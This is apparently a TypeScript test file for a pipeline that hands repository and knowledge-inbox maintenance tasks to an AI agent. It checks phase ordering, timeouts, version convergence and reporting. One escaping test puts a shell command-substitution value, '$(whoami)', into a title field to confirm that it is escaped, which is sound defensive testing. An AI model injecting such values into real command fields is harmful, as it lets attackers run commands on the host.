    const sleepFn = async () => {
      mockTime += 1000;
    };

    const mockScanData = {
      batch: true,
      results: [
        {
          repo: "order-service",
          path: "/srv/workspace/order-service",
          repoType: "code",
          status: "changed",
          hasChanges: true,
          from: "111",
          to: "222",
        },
        {
          repo: "system-knowledge",
          path: "/srv/workspace/system-knowledge",
          repoType: "system_knowledge",
          status: "upToDate",
          hasChanges: false,
          from: "999",
          to: "999",
        },
      ],
    };

    const dispatchedCmds: string[] = [];
    const execFn = async (cmd: string) => {
      if (cmd.includes("maintenance.list") && !cmd.includes("-- path=")) {
        return { stdout: JSON.stringify({ ok: true, data: mockScanData }), stderr: "" };
      }
      if (cmd.includes("order-service")) {
        return {
          stdout: JSON.stringify({
            ok: true,
            data: {
              repo: "order-service",
              from: "222",
              to: "222",
              hasChanges: false,
              status: "upToDate",
            },
          }),
          stderr: "",
        };
      }
      if (cmd.includes("system-knowledge")) {
        return {
          stdout: JSON.stringify({
            ok: true,
            data: {
              repo: "system-knowledge",
              from: "999",
              to: "999",
              checkpointUpdatedAt: new Date(mockTime + 500).toISOString(),
              hasChanges: false,
              status: "upToDate",
            },
          }),
          stderr: "",
        };
      }
      return { stdout: "{}", stderr: "" };
    };

    const result = (await runPipeline(
      {
        profile: "skm",
        dispatchCmd: "dispatch --repo {{repo}} --prompt '{{prompt}}'",
        timeout: 1,
        interval: 0.001,
      },
      {
        execFn,
        dispatchFn: async (cmd: string) => {
          dispatchedCmds.push(cmd);
        },
        sleepFn,
        nowFn,
      }
    )) as PipelineSummary;

    assert.equal(result.total, 2);
    assert.equal(result.completed, 2);
    assert.equal(dispatchedCmds.length, 2);
    // 验证第二阶段派发命令中包含系统知识库提示词与前序代码仓更新摘要
    const sysCmd = dispatchedCmds[1]!;
    assert.ok(sysCmd.includes("system-knowledge"));
    assert.ok(sysCmd.includes("系统知识库全局聚合维护指导"));
    assert.ok(sysCmd.includes("order-service：已推进检查点至 222"));
  });

  await t.test("前序代码仓均无变更且系统知识仓无变更时，系统知识仓自动跳过", async () => {
    const mockScanData = {
      batch: true,
      results: [
        {
          repo: "order-service",
          path: "/srv/workspace/order-service",
          repoType: "code",
          status: "upToDate",
          hasChanges: false,
          from: "222",
          to: "222",
        },
        {
          repo: "system-knowledge",
          path: "/srv/workspace/system-knowledge",
          repoType: "system_knowledge",
          status: "upToDate",
          hasChanges: false,
          from: "999",
          to: "999",
        },
      ],
    };

    const dispatchedCmds: string[] = [];
    const execFn = async () => ({
      stdout: JSON.stringify({ ok: true, data: mockScanData }),
      stderr: "",
    });

    const result = (await runPipeline(
      {
        profile: "skm",
        dispatchCmd: "dispatch --repo {{repo}}",
      },
      {
        execFn,
        dispatchFn: async (cmd: string) => {
          dispatchedCmds.push(cmd);
        },
      }
    )) as PipelineSummary;

    assert.equal(result.total, 2);
    assert.equal(result.skipped, 2);
    assert.equal(result.completed, 0);
    assert.equal(dispatchedCmds.length, 0);
    const sysRes = result.results.find((r) => r.repo === "system-knowledge");
    assert.equal(sysRes?.status, "skipped");
    assert.ok(sysRes?.message?.includes("跳过系统层维护"));
  });

  await t.test("开启 --skip-system-knowledge 时跳过系统知识库调度", async () => {
    const mockScanData = {
      batch: true,
      results: [
        {
          repo: "order-service",
          path: "/srv/workspace/order-service",
          repoType: "code",
          status: "changed",
          hasChanges: true,
          from: "111",
          to: "222",
        },
        {
          repo: "system-knowledge",
          path: "/srv/workspace/system-knowledge",
          repoType: "system_knowledge",
          status: "changed",
          hasChanges: true,
          from: "888",
          to: "999",
        },
      ],
    };

    const execFn = async () => ({
      stdout: JSON.stringify({ ok: true, data: mockScanData }),
      stderr: "",
    });

    const result = (await runPipeline(
      {
        profile: "skm",
        dryRun: true,
        skipSystemKnowledge: true,
        dispatchCmd: "dispatch --repo {{repo}}",
      },
      { execFn }
    )) as DryRunResult;

    // 系统知识仓被完全排除
    assert.equal(result.total, 1);
    assert.equal(result.dryRunOutput.length, 1);
    assert.equal(result.dryRunOutput[0]?.repo, "order-service");
  });

  await t.test("支持实时日志文件追加落盘 (logFile)", async () => {
    const tmpLogFile = path.join(os.tmpdir(), `test-pipeline-${Date.now()}.log`);

    const mockScanData = {
      results: [
        {
          repo: "order-service",
          path: "/srv/workspace/order-service",
          repoType: "code",
          status: "changed",
          hasChanges: true,
          from: "111",
          to: "222",
        },
      ],
    };

    const execFn = async () => ({
      stdout: JSON.stringify({ ok: true, data: mockScanData }),
      stderr: "",
    });

    const dispatchFn = async () => ({ pid: 1, output: "", exited: true });
    let sleepCount = 0;
    const sleepFn = async () => {
      sleepCount++;
    };

    let queryCount = 0;
    const mockQueryExec = async (cmd: string) => {
      queryCount++;
      if (queryCount === 1) {
        return {
          stdout: JSON.stringify({ ok: true, data: mockScanData }),
          stderr: "",
        };
      }
      return {
        stdout: JSON.stringify({
          ok: true,
          data: {
            repo: "order-service",
            path: "/srv/workspace/order-service",
            status: "upToDate",
            hasChanges: false,
            from: "222",
            to: "222",
          },
        }),
        stderr: "",
      };
    };

    try {
      await runPipeline(
        {
          profile: "skm",
          dispatchCmd: "dispatch --repo {{repo}}",
          logFile: tmpLogFile,
        },
        {
          execFn: mockQueryExec,
          dispatchFn,
          sleepFn,
        }
      );

      assert.ok(fs.existsSync(tmpLogFile));
      const logContent = fs.readFileSync(tmpLogFile, "utf8");
      assert.match(logContent, /开始执行知识维护流水线/);
      assert.match(logContent, /\[DISPATCH\] 派发维护任务 -> 仓库: order-service/);
      assert.match(logContent, /\[SUCCESS\] 仓库 order-service 检查点推进成功/);
      assert.match(logContent, /\[SUMMARY\] 流水线执行完毕/);
    } finally {
      if (fs.existsSync(tmpLogFile)) {
        fs.unlinkSync(tmpLogFile);
      }
    }
  });

  await t.test("遇到 repoType 为 inbox 的仓库时不归入 codeRepos 或 systemRepos", async () => {
    const mockScanData = {
      batch: true,
      results: [
        {
          repo: "order-service",
          path: "/srv/workspace/order-service",
          repoType: "code",
          status: "changed",
          hasChanges: true,
          from: "111",
          to: "222",
        },
        {
          repo: "knowledge-inbox",
          path: "/srv/knowledge-inbox",
          repoType: "inbox",
          sourceBranch: "main",
          status: "upToDate",
          hasChanges: false,
          to: "333",
        },
        {
          repo: "system-knowledge",
          path: "/srv/workspace/system-knowledge",
          repoType: "system_knowledge",
          status: "changed",
          hasChanges: true,
          from: "444",
          to: "555",
        },
      ],
    };

    const execFn = async () => ({
      stdout: JSON.stringify({ ok: true, data: mockScanData }),
      stderr: "",
    });

    const result = (await runPipeline(
      {
        profile: "skm",
        dryRun: true,
        dispatchCmd: "dispatch --repo {{repo}}",
        skipInbox: true,
      },
      { execFn }
    )) as DryRunResult;

    assert.equal(result.dryRun, true);
    // 只有 order-service 和 system-knowledge 进入了阶段一和阶段二
    assert.equal(result.total, 2);
    assert.equal(result.dryRunOutput.length, 2);
    assert.equal(result.dryRunOutput[0]?.repo, "order-service");
    assert.equal(result.dryRunOutput[1]?.repo, "system-knowledge");
    assert.ok(
      result.dryRunOutput.every((item) => item.repoType !== "inbox"),
      "inbox 仓库不应出现在代码仓或系统知识仓阶段"
    );
  });
});

test("Pipeline Runner - 第三阶段 Knowledge Inbox 待审池串行巡检与消费", async (t) => {
  const mockCandidate = {
    id: "20260924-a1b2c3",
    filename: "20260924-112345-a1b2c3-redis-split-brain.md",
    path: "/srv/knowledge-inbox/pending/20260924-112345-a1b2c3-redis-split-brain.md",
    status: "pending",
    title: "Redis Cluster 脑裂恢复指南",
    domain: "infrastructure",
    tags: ["redis", "cluster", "failover"],
    repos: ["order-service"],
    createdAt: "2026-09-24T11:23:45.000Z",
  };

  await t.test("buildInboxCandidatePrompt 生成合规性与核心指令要素验证", () => {
    const prompt = buildInboxCandidatePrompt(mockCandidate);

    // 元数据与背景
    assert.ok(prompt.includes("20260924-a1b2c3"));
    assert.ok(prompt.includes("Redis Cluster 脑裂恢复指南"));
    assert.ok(prompt.includes("20260924-112345-a1b2c3-redis-split-brain.md"));
    assert.ok(prompt.includes("/srv/knowledge-inbox/pending/20260924-112345-a1b2c3-redis-split-brain.md"));
    assert.ok(prompt.includes("infrastructure"));
    assert.ok(prompt.includes("order-service"));
    assert.ok(prompt.includes("redis, cluster, failover"));

    // 审查流程与四路决议
    assert.ok(prompt.includes("files.read"));
    assert.ok(prompt.includes("accepted"));
    assert.ok(prompt.includes("duplicate"));
    assert.ok(prompt.includes("insufficient_evidence"));
    assert.ok(prompt.includes("rejected"));

    // 零断链门禁与归档交付动作
    assert.ok(prompt.includes("links.verify"));
    assert.ok(prompt.includes("maintenance.publish"));
    assert.ok(prompt.includes("knowledge.archive"));

    // 双子代理协同与版本初筛收敛要求
    assert.ok(prompt.includes("主智能体统筹与专业子代理协同架构"));
    assert.ok(prompt.includes("版本初筛与消歧子代理"));
    assert.ok(prompt.includes("核心经验核验与合入子代理"));
    assert.ok(prompt.includes("版本演进链路"));
    assert.ok(prompt.includes("已被终版候选"));
    assert.ok(prompt.includes("全流程全自动自闭环"));
    assert.ok(prompt.includes("严禁在终端向用户提问或等待确认"));

    // 规范审计：无数字序号列表、无表情符号、无嵌套行内代码
    const lines = prompt.split("\n");
    for (const line of lines) {
      assert.ok(!/^\s*\d+\.\s+/.test(line), `提示词严禁使用数字列表: ${line}`);
      assert.ok(!/\*\*`[^`]+`\*\*/.test(line), `提示词严禁在粗体内部嵌套行内代码: ${line}`);
    }
    const emojiRegex = /[\u{1F300}-\u{1F6FF}\u{1F900}-\u{1F9FF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}]/u;
    assert.ok(!emojiRegex.test(prompt), "提示词严禁包含表情符号");
  });

  await t.test("buildInboxPlaceholders 抽取占位符并验证模版插值", () => {
    const placeholders = buildInboxPlaceholders(mockCandidate);

    assert.equal(placeholders.candidateId, "20260924-a1b2c3");
    assert.equal(placeholders.candidateTitle, "Redis Cluster 脑裂恢复指南");
    assert.equal(placeholders.candidateFilename, "20260924-112345-a1b2c3-redis-split-brain.md");
    assert.equal(placeholders.candidatePath, "/srv/knowledge-inbox/pending/20260924-112345-a1b2c3-redis-split-brain.md");
    assert.equal(placeholders.candidateDomain, "infrastructure");
    assert.ok(placeholders.prompt.includes("20260924-a1b2c3"));

    // 模版插值验证
    const template = 'dispatch --id="{{candidateId}}" --title="{{candidateTitle}}" --file="{{candidateFilename}}"';
    const rendered = renderTemplate(template, placeholders, { escapeQuotes: true });
    assert.equal(
      rendered,
      'dispatch --id="20260924-a1b2c3" --title="Redis Cluster 脑裂恢复指南" --file="20260924-112345-a1b2c3-redis-split-brain.md"'
    );

    // 验证包含内部双引号与特殊字符的字段会被正确转义
    const candidateWithQuotes = {
      ...mockCandidate,
      title: 'Redis "Cluster" 脑裂 $(whoami)',
    };
    const placeholdersWithQuotes = buildInboxPlaceholders(candidateWithQuotes);
    const renderedWithQuotes = renderTemplate(template, placeholdersWithQuotes, { escapeQuotes: true });
    assert.ok(renderedWithQuotes.includes('\\"Cluster\\"'));
    assert.ok(renderedWithQuotes.includes('\\$(whoami)'));
  });

  await t.test("runInboxPhase: 待审池为空时秒级跳过", async () => {
    const mockExec = async (cmd: string) => {
      assert.ok(cmd.includes("knowledge.list"));
      return {
        stdout: JSON.stringify({ ok: true, data: { items: [] } }),
        stderr: "",
      };
    };

    let dispatched = false;
    const dispatchFn = async () => {
      dispatched = true;
    };

    const summary = await runInboxPhase(
      { profile: "skm", dispatchCmd: "dummy" },
      { execFn: mockExec, dispatchFn }
    );

    assert.equal(summary.inboxTotal, 0);
    assert.equal(summary.inboxCompleted, 0);
    assert.equal(summary.inboxFailed, 0);
    assert.equal(summary.inboxSkipped, false);
    assert.equal(summary.inboxResults.length, 0);
    assert.equal(dispatched, false, "待审池为空时严禁派发任务");
  });

  await t.test("runInboxPhase: skipInbox 为 true 时跳过待审池", async () => {
    let queried = false;
    const mockExec = async () => {
      queried = true;
      return { stdout: "{}", stderr: "" };
    };

    const summary = await runInboxPhase(
      { profile: "skm", skipInbox: true },
      { execFn: mockExec }
    );

    assert.equal(summary.inboxTotal, 0);
    assert.equal(summary.inboxCompleted, 0);
    assert.equal(summary.inboxFailed, 0);
    assert.equal(summary.inboxSkipped, true);
    assert.equal(summary.inboxResults.length, 0);
    assert.equal(queried, false, "skipInbox 为 true 时严禁执行查询");
  });

  await t.test("runInboxPhase: 多个候选串行逐个派发与轮询探测移出 pending", async () => {
    const candidate1 = {
      id: "20260924-c1",
      filename: "c1.md",
      title: "Candidate 1",
    };
    const candidate2 = {
      id: "20260924-c2",
      filename: "c2.md",
      title: "Candidate 2",
    };

    // 模拟待审池状态：初始有两个，经过派发与轮询后逐个移出
    let pendingList = [candidate1, candidate2];
    const dispatchedList: string[] = [];

    const mockExec = async (cmd: string) => {
      if (cmd.includes("knowledge.list")) {
        return {
          stdout: JSON.stringify({ ok: true, data: { items: [...pendingList] } }),
          stderr: "",
        };
      }
      return { stdout: "{}", stderr: "" };
    };

    let sleepCalls = 0;
    const sleepFn = async () => {
      sleepCalls++;
      // 模拟 Agent 异步执行归档：在轮询探测时移出当前候选
      if (pendingList.length > 0) {
        pendingList.shift();
      }
    };

    const dispatchFn = async (cmd: string, placeholders: any) => {
      dispatchedList.push(placeholders.candidateId);
      return { pid: 1, output: "", exited: true };
    };

    const summary = await runInboxPhase(
      { profile: "skm", dispatchCmd: 'dispatch --id="{{candidateId}}"', interval: 1, timeout: 5 },
      { execFn: mockExec, dispatchFn, sleepFn }
    );

    assert.equal(summary.inboxTotal, 2);
    assert.equal(summary.inboxCompleted, 2);
    assert.equal(summary.inboxFailed, 0);
    assert.equal(summary.inboxSkipped, false);
    assert.equal(summary.inboxResults.length, 2);
    assert.equal(summary.inboxResults[0].id, "20260924-c1");
    assert.equal(summary.inboxResults[0].status, "completed");
    assert.equal(summary.inboxResults[1].id, "20260924-c2");
    assert.equal(summary.inboxResults[1].status, "completed");

    // 验证串行派发顺序
    assert.deepEqual(dispatchedList, ["20260924-c1", "20260924-c2"]);
  });

  await t.test("runInboxPhase: 超时容错处理（候选未移出待审池时标记失败）", async () => {
    const candidate = {
      id: "20260924-timeout",
      filename: "timeout.md",
      title: "Timeout Candidate",
    };

    // 模拟待审池一直不移出
    const mockExec = async () => ({
      stdout: JSON.stringify({ ok: true, data: { items: [candidate] } }),
      stderr: "",
    });

    let mockCurrentTime = 1000000;
    const nowFn = () => mockCurrentTime;

    const sleepFn = async () => {
      // 步进时间触发超时 (timeout 为 1 分钟 = 60000ms)
      mockCurrentTime += 70000;
    };

    const summary = await runInboxPhase(
      { profile: "skm", dispatchCmd: "dispatch", timeout: 1, interval: 1 },
      {
        execFn: mockExec,
        dispatchFn: async () => {},
        sleepFn,
        nowFn,
      }
    );

    assert.equal(summary.inboxTotal, 1);
    assert.equal(summary.inboxCompleted, 0);
    assert.equal(summary.inboxFailed, 1);
    assert.equal(summary.inboxResults[0].status, "failed");
    assert.ok(summary.inboxResults[0].error?.includes("超时"));
  });

  await t.test("runInboxPhase: 派发异常容错处理（不中断后续候选）", async () => {
    const candidate1 = { id: "c1", filename: "c1.md", title: "C1" };
    const candidate2 = { id: "c2", filename: "c2.md", title: "C2" };

    let pendingList = [candidate1, candidate2];

    const mockExec = async () => ({
      stdout: JSON.stringify({ ok: true, data: { items: [...pendingList] } }),
      stderr: "",
    });

    const dispatchFn = async (cmd: string, placeholders: any) => {
      if (placeholders.candidateId === "c1") {
        throw new Error("网络连接拒绝");
      }
    };

    const sleepFn = async () => {
      pendingList = pendingList.filter((c) => c.id !== "c2");
    };

    const summary = await runInboxPhase(
      { profile: "skm", dispatchCmd: "dispatch", timeout: 5, interval: 1 },
      { execFn: mockExec, dispatchFn, sleepFn }
    );

    assert.equal(summary.inboxTotal, 2);
    assert.equal(summary.inboxCompleted, 1);
    assert.equal(summary.inboxFailed, 1);
    assert.equal(summary.inboxResults[0].id, "c1");
    assert.equal(summary.inboxResults[0].status, "failed");
    assert.ok(summary.inboxResults[0].error?.includes("网络连接拒绝"));
    assert.equal(summary.inboxResults[1].id, "c2");
    assert.equal(summary.inboxResults[1].status, "completed");
  });

  await t.test("runInboxPhase: 同源多版本候选初筛与版本收敛（前置探测跳过已归档候选）", async () => {
    const v1 = {
      id: "20260924-v1",
      filename: "v1.md",
      title: "Redis Cluster 脑裂排查 v1",
    };
    const v2 = {
      id: "20260924-v2",
      filename: "v2.md",
      title: "Redis Cluster 脑裂排查 v2 (修正)",
    };
    const v3 = {
      id: "20260924-v3",
      filename: "v3.md",
      title: "Redis Cluster 脑裂排查 v3 (终版)",
    };

    // 待审池初始包含同源 3 个版本
    let pendingList = [v1, v2, v3];
    const dispatchedList: string[] = [];
    const loggedMessages: string[] = [];

    const mockExec = async (cmd: string) => {
      if (cmd.includes("knowledge.list")) {
        return {
          stdout: JSON.stringify({ ok: true, data: { items: [...pendingList] } }),
          stderr: "",
        };
      }
      return { stdout: "{}", stderr: "" };
    };

    const sleepFn = async () => {
      // 模拟 v1 派发后，AI 初筛子代理识别 v3 为终版，将历史版本 v1、v2 快速归档（duplicate），并将 v3 合入归档（accepted）
      // 此时待审池中 v1、v2、v3 均已移出 pending 列表
      pendingList = [];
    };

    const dispatchFn = async (cmd: string, placeholders: any) => {
      dispatchedList.push(placeholders.candidateId);
      return { pid: 1, output: "", exited: true };
    };

    const summary = await runInboxPhase(
      { profile: "skm", dispatchCmd: 'dispatch --id="{{candidateId}}"', timeout: 5, interval: 1 },
      {
        execFn: mockExec,
        dispatchFn,
        sleepFn,
      },
      {
        writeLog: (msg: string) => loggedMessages.push(msg),
      }
    );

    // 验证待审池候选总数为 3，全部判定为已完成
    assert.equal(summary.inboxTotal, 3);
    assert.equal(summary.inboxCompleted, 3);
    assert.equal(summary.inboxFailed, 0);
    assert.equal(summary.inboxSkipped, false);
    assert.equal(summary.inboxResults.length, 3);

    // 核心断言：仅有首篇 v1 触发了实际派发！v2 与 v3 均被前置探测拦截并跳过，避免唤醒外部 AI
    assert.deepEqual(dispatchedList, ["20260924-v1"]);

    // 验证跳过的候选被正确记录为 completed，耗时为 0
    assert.equal(summary.inboxResults[0].id, "20260924-v1");
    assert.equal(summary.inboxResults[0].status, "completed");
    assert.equal(summary.inboxResults[1].id, "20260924-v2");
    assert.equal(summary.inboxResults[1].status, "completed");
    assert.equal(summary.inboxResults[1].durationMs, 0);
    assert.equal(summary.inboxResults[2].id, "20260924-v3");
    assert.equal(summary.inboxResults[2].status, "completed");
    assert.equal(summary.inboxResults[2].durationMs, 0);

    // 验证日志中记录了前置收敛跳过信息
    assert.ok(loggedMessages.some((msg) => msg.includes("[SKIP] 待审候选 20260924-v2 已被初筛或前序终版候选收敛归档，跳过派发")));
    assert.ok(loggedMessages.some((msg) => msg.includes("[SKIP] 待审候选 20260924-v3 已被初筛或前序终版候选收敛归档，跳过派发")));
  });

  await t.test("runInboxPhase: 混合场景下多版本收敛与常规候选串行推进", async () => {
    const candidateA = { id: "cand-a", filename: "a.md", title: "MySQL 连接池泄漏" };
    const candB1 = { id: "cand-b1", filename: "b1.md", title: "Kafka Rebalance 优化 v1" };
    const candB2 = { id: "cand-b2", filename: "b2.md", title: "Kafka Rebalance 优化 v2 终版" };
    const candidateC = { id: "cand-c", filename: "c.md", title: "JVM 元空间内存溢出" };

    let pendingList = [candidateA, candB1, candB2, candidateC];
    const dispatchedList: string[] = [];

    const mockExec = async (cmd: string) => {
      if (cmd.includes("knowledge.list")) {
        return {
          stdout: JSON.stringify({ ok: true, data: { items: [...pendingList] } }),
          stderr: "",
        };
      }
      return { stdout: "{}", stderr: "" };
    };

    let activeCandidateId = "";
    const dispatchFn = async (cmd: string, placeholders: any) => {
      activeCandidateId = placeholders.candidateId;
      dispatchedList.push(placeholders.candidateId);
      return { pid: 1, output: "", exited: true };
    };

    const sleepFn = async () => {
      if (activeCandidateId === "cand-a") {
        // cand-a 仅归档自身
        pendingList = pendingList.filter((item) => item.id !== "cand-a");
      } else if (activeCandidateId === "cand-b1") {
        // cand-b1 派发时，初筛识别 b2 为终版，同时将 b1 和 b2 均归档移出 pending
        pendingList = pendingList.filter((item) => item.id !== "cand-b1" && item.id !== "cand-b2");
      } else if (activeCandidateId === "cand-c") {
        // cand-c 仅归档自身
        pendingList = pendingList.filter((item) => item.id !== "cand-c");
      }
    };

    const summary = await runInboxPhase(
      { profile: "skm", dispatchCmd: "dispatch", timeout: 5, interval: 1 },
      { execFn: mockExec, dispatchFn, sleepFn }
    );

    assert.equal(summary.inboxTotal, 4);
    assert.equal(summary.inboxCompleted, 4);
    assert.equal(summary.inboxFailed, 0);

    // cand-b2 被前置跳过，派发清单仅包含 cand-a, cand-b1, cand-c
    assert.deepEqual(dispatchedList, ["cand-a", "cand-b1", "cand-c"]);
    const b2Result = summary.inboxResults.find((r) => r.id === "cand-b2");
    assert.equal(b2Result?.status, "completed");
    assert.equal(b2Result?.durationMs, 0);
  });

  await t.test("runInboxPhase: 前置探测阶段网络异常容错处理（不阻断常规派发）", async () => {
    const candidate1 = { id: "cand-1", filename: "1.md", title: "Title 1" };
    const candidate2 = { id: "cand-2", filename: "2.md", title: "Title 2" };

    let pendingList = [candidate1, candidate2];
    const dispatchedList: string[] = [];
    let queryCallCount = 0;

    const mockExec = async (cmd: string) => {
      if (cmd.includes("knowledge.list")) {
        queryCallCount++;
        // 模拟第 3 次调用（即 cand-2 的前置探测）抛出临时网络错误
        if (queryCallCount === 3) {
          throw new Error("ETIMEDOUT: Connection timed out");
        }
        return {
          stdout: JSON.stringify({ ok: true, data: { items: [...pendingList] } }),
          stderr: "",
        };
      }
      return { stdout: "{}", stderr: "" };
    };

    let currentDispatched = "";
    const dispatchFn = async (cmd: string, placeholders: any) => {
      currentDispatched = placeholders.candidateId;
      dispatchedList.push(placeholders.candidateId);
      return { pid: 1, output: "", exited: true };
    };

    const sleepFn = async () => {
      pendingList = pendingList.filter((item) => item.id !== currentDispatched);
    };

    const summary = await runInboxPhase(
      { profile: "skm", dispatchCmd: "dispatch", timeout: 5, interval: 1 },
      { execFn: mockExec, dispatchFn, sleepFn }
    );

    assert.equal(summary.inboxTotal, 2);
    assert.equal(summary.inboxCompleted, 2);
    assert.equal(summary.inboxFailed, 0);
    // 前置探测网络异常时容错继续派发，两者均成功完成
    assert.deepEqual(dispatchedList, ["cand-1", "cand-2"]);
  });

  await t.test("renderDashboard 终端看板支持待审池进度展示", () => {
    const dashboard = renderDashboard({
      total: 3,
      processed: 3,
      skipped: 1,
      completed: 2,
      failed: 0,
      totalElapsed: 45000,
      inboxTotal: 4,
      inboxProcessed: 2,
      inboxCompleted: 2,
      inboxFailed: 0,
      activeCandidate: "20260924-a1 (Redis 排障)",
      activeCandidateElapsed: 12000,
    });

    assert.ok(dashboard.includes("待审池进度:"));
    assert.ok(dashboard.includes("待审候选总数: 4 | 已归档: 2 | 失败: 0"));
    assert.ok(dashboard.includes("当前待审候选: 20260924-a1 (Redis 排障)"));
    assert.ok(dashboard.includes("单篇耗时: 00:12"));

    // 验证跳过状态
    const skippedDashboard = renderDashboard({
      total: 2,
      processed: 2,
      skipped: 2,
      completed: 0,
      failed: 0,
      totalElapsed: 5000,
      inboxSkipped: true,
    });
    assert.ok(skippedDashboard.includes("待审池阶段: 已跳过"));
  });

  await t.test("generateMarkdownReport 结算报告中待审池明细表格渲染验证", () => {
    const reportData = {
      profile: "skm",
      total: 2,
      completed: 2,
      skipped: 0,
      failed: 0,
      totalElapsedMs: 30000,
      results: [
        {
          repo: "order-service",
          path: "/srv/workspace/order-service",
          repoType: "code" as const,
          status: "completed" as const,
          durationMs: 15000,
          message: "检查点推进成功",
        },
      ],
      inboxTotal: 2,
      inboxCompleted: 1,
      inboxFailed: 1,
      inboxSkipped: false,
      inboxResults: [
        {
          id: "20260924-a1",
          filename: "a1.md",
          title: "MySQL 2006 超时",
          durationMs: 8000,
          status: "completed" as const,
          error: null,
        },
        {
          id: "20260924-b2",
          filename: "b2.md",
          title: "K8s 内存泄露",
          durationMs: 15000,
          status: "failed" as const,
          error: "等待候选归档超时 (15 分钟)",
        },
      ],
    };

    const md = generateMarkdownReport(reportData);

    assert.ok(md.includes("- 待审候选总数：2"));
    assert.ok(md.includes("- 待审成功归档数：1"));
    assert.ok(md.includes("- 待审处理失败数：1"));
    assert.ok(md.includes("## 待审池处理明细"));
    assert.ok(md.includes("| 候选标识 | 候选标题 | 文件名 | 状态 | 耗时 | 说明 |"));
    assert.ok(md.includes("| 20260924-a1 | MySQL 2006 超时 | a1.md | 成功归档 | 00:08 | 已完成归档闭环 |"));
    assert.ok(md.includes("| 20260924-b2 | K8s 内存泄露 | b2.md | 处理失败 | 00:15 | 等待候选归档超时 (15 分钟) |"));

    // 验证 AGENTS.md 规范：无数字列表、无表情符号
    const lines = md.split("\n");
    for (const line of lines) {
      assert.ok(!/^\s*\d+\.\s+/.test(line), `报告严禁使用数字列表: ${line}`);
    }
  });

  await t.test("runPipeline 端到端完整三阶段串行调度集成验证", async () => {
    const mockRepoScan = {
      batch: true,
      results: [
        {
          repo: "demo-service",
          path: "/srv/workspace/demo-service",
          branch: "release",
          status: "changed",
          hasChanges: true,
          from: "111",
          to: "222",
          commitCount: 1,
          commits: [{ hash: "222", shortHash: "222", message: "feat: update" }],
        },
      ],
    };

    const candidate = {
      id: "20260924-p3",
      filename: "p3.md",
      title: "Phase 3 Candidate",
    };
    let inboxItems = [candidate];

    const dispatchedCmds: string[] = [];
    const mockExec = async (cmd: string) => {
      if (cmd.includes("maintenance.list")) {
        if (!cmd.includes("-- path=")) {
          return { stdout: JSON.stringify({ ok: true, data: mockRepoScan }), stderr: "" };
        }
        return {
          stdout: JSON.stringify({
            ok: true,
            data: { repo: "demo-service", status: "upToDate", from: "222", to: "222", hasChanges: false },
          }),
          stderr: "",
        };
      }
      if (cmd.includes("knowledge.list")) {
        return {
          stdout: JSON.stringify({ ok: true, data: { items: [...inboxItems] } }),
          stderr: "",
        };
      }
      return { stdout: "{}", stderr: "" };
    };

    let phase3Started = false;
    const sleepFn = async () => {
      // 只有进入第三阶段待审池轮询时，才移出待审池
      if (phase3Started) {
        inboxItems = [];
      }
    };

    const dispatchFn = async (cmd: string, placeholders: any) => {
      if (placeholders.candidateId) {
        phase3Started = true;
      }
      dispatchedCmds.push(placeholders.candidateId || placeholders.repo);
      return { pid: 1, output: "", exited: true };
    };

    const summary = (await runPipeline(
      {
        profile: "skm",
        dispatchCmd: "dispatch --target {{repo}}{{candidateId}}",
        timeout: 5,
        interval: 1,
      },
      { execFn: mockExec, dispatchFn, sleepFn }
    )) as PipelineSummary;

    assert.equal(summary.success, true);
    assert.equal(summary.total, 1);
    assert.equal(summary.completed, 1);
    assert.equal(summary.inboxTotal, 1);
    assert.equal(summary.inboxCompleted, 1);
    assert.equal(summary.inboxFailed, 0);
    assert.equal(summary.inboxSkipped, false);

    // 验证派发包含了代码仓与待审候选
    assert.deepEqual(dispatchedCmds, ["demo-service", "20260924-p3"]);
  });

  await t.test("runPipeline 端到端三阶段调度中待审池多版本收敛闭环验证", async () => {
    const mockRepoScan = {
      batch: true,
      results: [
        {
          repo: "demo-service",
          path: "/srv/workspace/demo-service",
          branch: "release",
          status: "changed",
          hasChanges: true,
          from: "111",
          to: "222",
          commitCount: 1,
          commits: [{ hash: "222", shortHash: "222", message: "feat: update" }],
        },
      ],
    };

    const candV1 = {
      id: "20260924-v1",
      filename: "v1.md",
      title: "Redis Failover v1",
    };
    const candV2 = {
      id: "20260924-v2",
      filename: "v2.md",
      title: "Redis Failover v2 终版",
    };
    let inboxItems = [candV1, candV2];

    const dispatchedTargets: string[] = [];
    const mockExec = async (cmd: string) => {
      if (cmd.includes("maintenance.list")) {
        if (!cmd.includes("-- path=")) {
          return { stdout: JSON.stringify({ ok: true, data: mockRepoScan }), stderr: "" };
        }
        return {
          stdout: JSON.stringify({
            ok: true,
            data: { repo: "demo-service", status: "upToDate", from: "222", to: "222", hasChanges: false },
          }),
          stderr: "",
        };
      }
      if (cmd.includes("knowledge.list")) {
        return {
          stdout: JSON.stringify({ ok: true, data: { items: [...inboxItems] } }),
          stderr: "",
        };
      }
      return { stdout: "{}", stderr: "" };
    };

    let p3Dispatched = false;
    const sleepFn = async () => {
      // 当首篇候选派发后，AI 初筛收敛使得 v1 和 v2 均已移出 pending
      if (p3Dispatched) {
        inboxItems = [];
      }
    };

    const dispatchFn = async (cmd: string, placeholders: any) => {
      const target = placeholders.candidateId || placeholders.repo;
      dispatchedTargets.push(target);
      if (placeholders.candidateId) {
        p3Dispatched = true;
      }
      return { pid: 1, output: "", exited: true };
    };

    const summary = (await runPipeline(
      {
        profile: "skm",
        dispatchCmd: "dispatch --target {{repo}}{{candidateId}}",
        timeout: 5,
        interval: 1,
      },
      { execFn: mockExec, dispatchFn, sleepFn }
    )) as PipelineSummary;

    assert.equal(summary.success, true);
    assert.equal(summary.total, 1);
    assert.equal(summary.completed, 1);
    assert.equal(summary.inboxTotal, 2);
    assert.equal(summary.inboxCompleted, 2);
    assert.equal(summary.inboxFailed, 0);

    // 核心断言：待审池两篇候选，仅有 v1 触发实际派发，v2 自动收敛跳过
    assert.deepEqual(dispatchedTargets, ["demo-service", "20260924-v1"]);

    // 结算报告包含 2 篇候选均已闭环
    assert.ok(summary.markdownReport.includes("- 待审候选总数：2"));
    assert.ok(summary.markdownReport.includes("- 待审成功归档数：2"));
    assert.ok(summary.markdownReport.includes("20260924-v1"));
    assert.ok(summary.markdownReport.includes("20260924-v2"));
  });
});

